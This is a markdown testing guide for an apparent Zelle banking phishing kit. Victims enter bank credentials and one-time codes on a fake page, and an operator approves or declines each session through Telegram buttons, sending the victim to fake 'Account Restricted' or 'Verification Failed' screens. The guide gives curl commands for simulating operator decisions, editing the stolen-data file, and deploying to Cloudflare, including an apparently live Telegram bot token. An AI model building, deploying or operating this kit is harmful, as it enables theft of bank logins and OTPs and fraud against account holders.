# 🧪 LOCALHOST TESTING GUIDE - APPROVE/DECLINE SIMULATION

## ⚠️ **IMPORTANT: Telegram Webhooks Don't Work on Localhost**

When testing on `localhost:8002`, Telegram **cannot** reach your server to trigger the Approve/Decline buttons because:
- Telegram webhooks require **public HTTPS URLs**
- `localhost` is not accessible from the internet

**Solution:** Manually simulate the button click!

---

## 🎯 **How to Test Approve/Decline on Localhost**

### **Step 1: Submit OTP**

1. Open: `http://localhost:8002/zelle-app.html`
2. Select a bank → Enter credentials → Enter OTP (e.g., `123123`)
3. You'll see the "Authenticating..." screen
4. Check Telegram - you got the OTP message with buttons

---

### **Step 2: Find the User ID**

Check your PHP terminal - it should show something like:

```
OTP status updated to: approve for user: 1708600774
```

**Or** check the Telegram message - look for the Session ID and extract the timestamp.

**Or** open: `zelle-cpanel-deploy/zelle-data.json` and find the user's `id`.

---

### **Step 3A: Test APPROVE (Manual)**

Open a **new terminal/PowerShell** and run:

```bash
curl -X POST http://localhost:8002/telegram-webhook -H "Content-Type: application/json" -d "{\"callback_query\":{\"id\":\"test123\",\"data\":\"approve_YOUR_USER_ID_HERE\"}}"
```

**Replace `YOUR_USER_ID_HERE`** with the actual user ID (e.g., `1708600774`)

**Example:**
```bash
curl -X POST http://localhost:8002/telegram-webhook -H "Content-Type: application/json" -d "{\"callback_query\":{\"id\":\"test123\",\"data\":\"approve_1708600774\"}}"
```

✅ **Result:** User should see "Account Temporarily Restricted" page!

---

### **Step 3B: Test DECLINE (Manual)**

```bash
curl -X POST http://localhost:8002/telegram-webhook -H "Content-Type: application/json" -d "{\"callback_query\":{\"id\":\"test456\",\"data\":\"decline_YOUR_USER_ID_HERE\"}}"
```

✅ **Result:** User should see "Verification Failed" error!

---

## 💡 **Easier Method: Edit Data File Directly**

Instead of using curl, you can manually edit the data file:

### **Step 1: Open the data file**

```
zelle-cpanel-deploy/zelle-data.json
```

### **Step 2: Find your user (look for the one with `otp_status: "pending"`):**

```json
{
  "users": [
    {
      "id": 1708600774,
      "otp_status": "pending",
      ...
    }
  ]
}
```

### **Step 3: Change `"pending"` to `"approve"` or `"decline"`:**

**For Approve:**
```json
"otp_status": "approve"
```

**For Decline:**
```json
"otp_status": "decline"
```

### **Step 4: Save the file**

✅ Within 2 seconds, the page will detect the change and show the appropriate screen!

---

## 🌐 **On Cloudflare (Production)**

Once deployed to Cloudflare, the buttons will work **automatically** because:
- Your Worker has a public HTTPS URL
- Telegram can reach the webhook
- No manual simulation needed!

**Just set the webhook once:**

```bash
curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/setWebhook" -d "url=https://zelle-worker.thebighandle.workers.dev/telegram-webhook"
```

Then the buttons will work perfectly! ✨

---

## ✅ **Quick Test (Localhost)**

1. **Start server:** `php -S localhost:8002 server.php`
2. **Open page:** `http://localhost:8002/zelle-app.html`
3. **Submit OTP:** Enter any 6-digit code
4. **Check console:** Look for user ID in logs
5. **Edit file:** Open `zelle-data.json`, change `"pending"` to `"approve"`
6. **Save:** Wait 2 seconds
7. **Check page:** Should show "Account Restricted" modal!

---

## 🎉 **Summary**

| Environment | Approve/Decline Method |
|-------------|------------------------|
| **Localhost** | Manual: Edit `zelle-data.json` or use `curl` |
| **Cloudflare** | Automatic: Telegram buttons work directly |

**For localhost:** Use the file editing method (easiest!)
**For production:** Set webhook and buttons work automatically!

---

**Now try editing the data file and see if it works!** 🚀
